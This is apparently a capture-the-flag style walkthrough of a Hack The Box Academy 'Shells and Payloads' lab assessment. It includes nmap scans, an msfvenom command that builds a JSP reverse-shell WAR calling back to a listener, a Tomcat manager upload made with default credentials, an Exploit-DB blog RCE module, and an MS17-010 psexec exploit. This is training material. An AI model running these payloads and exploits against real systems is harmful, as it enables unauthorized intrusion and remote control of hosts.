Shells and Payloads

Live engagement:
 Scenario:
 CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit payloads, and shells will be used to control the targets. Once on the VPN or from your Pwnbox, we will need to RDP into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.


Objectives:
 Demonstrate your knowledge of exploiting and receiving an interactive shell from a Windows host or server.
 Demonstrate your knowledge of exploiting and receiving an interactive shell from a Linux host or server.
 Demonstrate your knowledge of exploiting and receiving an interactive shell from a Web application.
 Demonstrate your ability to identify the shell environment you have access to as a user on the victim host.


Foothold IP: 10.129.204.1

  Host-01: 172.16.1.11
  
 
  Host-02: blog.inlanefreight.local

  
  Host-03: 172.16.1.13

machine::
  
  IP == 10.129.204.126

  
  Username == the-student

  
  Password == HTB_@cademy_stdnt!



let's get started
  first, we need to connect RDP by using xfreerdp
     xfreerdp /v:<target IP> /u:htb-student /p: HTB_@cademy_stdnt!

  What is the hostname of Host-1? (Format: all lowercase)
 
  for this let's initiate an Nmap scan to find the hostname: 

     
     sudo nmap -sCV -O -Pn 172.16.1.11 
 
 ![Screenshot 2023-07-04 at 17 22 34](https://github.com/darshilthummar/hackthebox/assets/49148722/fa2d2b34-1582-4194-888a-48d62ee631e3)

 
 as we can see there are lots of ports open, scroll down and we can see the hostname 'shells-wins


![Screenshot 2023-07-04 at 17 23 03](https://github.com/darshilthummar/hackthebox/assets/49148722/122928fe-63c2-483c-a5c0-7000c6169ade)

as per the result that finds that host is running windows



Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lowercase)

 
 as we have lots of information about the host so lest plan our attack to find the exploit. The host is ruing the Apache tomcat server so we have to find an exploit which runs on Java lang.
first, we need to start Metasploit 


   msfconsole 

 
   search auxiliary/scanner/HTTP/tomcat_mgr_upload

![Screenshot 2023-07-08 at 20 22 40](https://github.com/darshilthummar/hackthebox/assets/49148722/3543c429-f135-48a7-bfe7-a91229fe795d)



![Screenshot 2023-07-09 at 08 25 16](https://github.com/darshilthummar/hackthebox/assets/49148722/11c1834a-e654-490d-9730-ccb34a8e45ee)


Fill in the requirement and exploit.

 
But it not working. so let's try a manual exploit.


We need to create the first payload by using msfvenom


  msfvenom -l payloads | grep java

![Screenshot 2023-07-08 at 20 36 23](https://github.com/darshilthummar/hackthebox/assets/49148722/53b45d65-8fcf-411a-afcb-ed690ef83a8b)


We are going to use 'java/jsp_shell_reverse_tcp'


let's find out the options

 
   msfvenom -p java/jsp_shell_reverse_tcp - list-options

 
 ![Screenshot 2023-07-09 at 08 29 56](https://github.com/darshilthummar/hackthebox/assets/49148722/42ee20dd-21c6-4cf7-803f-c65ded83aab2)


it only requires a host and port


let's set the payload 


   msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=9001 -f war -o shell.war


![Screenshot 2023-07-09 at 08 31 28](https://github.com/darshilthummar/hackthebox/assets/49148722/fac1c00b-84dd-4651-b92c-2267f2a73b38)

 
now we have to create a listener port 


 we use msfconsole multi/handler

   ![Screenshot 2023-07-09 at 08 36 04](https://github.com/darshilthummar/hackthebox/assets/49148722/6e23b1cd-1de5-4ba7-8bcf-e855ef804ee3)


set payload java/jsp_shell_reverse_tcp
 set LHOST 172.16.1.5
 set LPORT 9001
 run

 
now we have to upload the shell into the site and execute the file, for that, we need to login into the manage page
 as we have credentials, let's login by using that credentials:
" tomcat | Tomcatadm "

![Screenshot 2023-07-09 at 08 37 48](https://github.com/darshilthummar/hackthebox/assets/49148722/6502e758-687d-4463-bb53-3cee0d8da0f6)


now upload the shell find and click on it and execute then wait for the connection.


![Screenshot 2023-07-09 at 08 38 02](https://github.com/darshilthummar/hackthebox/assets/49148722/e6b58e6a-233d-4ec3-9198-89d0034932b7)


![Screenshot 2023-07-09 at 08 38 51](https://github.com/darshilthummar/hackthebox/assets/49148722/1e84b97c-6c4f-41bd-9f6b-1171ca42947e)

as we establish a connection jump into C:\Shares directly


![Screenshot 2023-07-09 at 08 40 08](https://github.com/darshilthummar/hackthebox/assets/49148722/54347067-09c7-46bd-9488-dba204edc750)


What distribution of Linux is running on Host-2? (Format: distro name, all lowercase)


let's scan host-02 for that we need ip add.


search on hotsts file. 


![Screenshot 2023-07-09 at 08 42 04](https://github.com/darshilthummar/hackthebox/assets/49148722/9a39e7e7-2b2d-4e5f-b58a-49105c0ba67a)


  nmap -sCV -O 172.16.1.12


  ![Screenshot 2023-07-09 at 08 43 57](https://github.com/darshilthummar/hackthebox/assets/49148722/b3daa497-893a-4ea2-9221-13c7495c1dc2)


as we see from the result the host is running Ubuntu


What language is the shell written in that gets uploaded when using the 50064?rb exploit?


![Screenshot 2023-07-09 at 08 45 09](https://github.com/darshilthummar/hackthebox/assets/49148722/ee543eb5-7e5c-4b5f-9e18-787c9277535d)


is running on PHP


Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt


for this, we need to import the 50064.rb into Metasploit.


first, we need to find the path that we need to put this file

 
 searchsploit 50064.rd
 

this will help to identify the exploit file path.


 Lightweight Facebook-styled blog 1.3 - Remote Code Execution (RC | php/webapps/50064.rb,


let's jump to the Metasploit directory.


 creat php dir under exploit dir, then creat webapps under php dir.


cp the file 50064.rb and pest to webapps dir.


run msfconsole 

 
 run reload_all to reload all exploits


use exploit/php/web apps


![Screenshot 2023-07-09 at 12 47 19](https://github.com/darshilthummar/hackthebox/assets/49148722/627c861d-cdf2-4cea-b891-bf20ea8c4e40)


Search all options and fill in with given creds then run.


![Screenshot 2023-07-09 at 12 55 58](https://github.com/darshilthummar/hackthebox/assets/49148722/79828f39-5e19-4593-97cd-46c37963eb2f)


as we see it make a connection with the 172.16.1.12 host with a blind shell


jump to cd ./customscripts/


![Screenshot 2023-07-09 at 12 48 56](https://github.com/darshilthummar/hackthebox/assets/49148722/ca1a6a5b-13dd-4cd7-8de6-41148885a7bf)


here is the flag.txt


What is the hostname of Host-3?


same scan with Nmap with -O tag for the hostname.


![Screenshot 2023-07-09 at 12 57 36](https://github.com/darshilthummar/hackthebox/assets/49148722/07c1c97a-f46a-44b9-9406-007b61047e01)


as we can see list of ports are open


445 is open we can use exploit


![Screenshot 2023-07-09 at 12 57 46](https://github.com/darshilthummar/hackthebox/assets/49148722/35e39740-57c3-4591-8591-30b3ee8f10b1)


Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt

 
Search ms17 host using Windows.


 ![Screenshot 2023-07-09 at 13 53 53](https://github.com/darshilthummar/hackthebox/assets/49148722/60a695b2-c3a5-462d-869e-b404073a5b81)


use ms17_010_psexec


set all requirements and run.


![Screenshot 2023-07-09 at 13 54 13](https://github.com/darshilthummar/hackthebox/assets/49148722/5f6fcf20-7beb-476d-9b77-4b2020255563)


as we get the connection


jump into C:\Users\Administrator\Desktop\


![Screenshot 2023-07-09 at 13 54 53](https://github.com/darshilthummar/hackthebox/assets/49148722/94196bcc-6e5b-4fca-8b00-9c50324fb839)


we get Skills-flag.txt



references

https://hackingvision.com/2017/02/18/installing-metasploit-modules/

https://www.exploit-db.com/exploits/50064

https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/

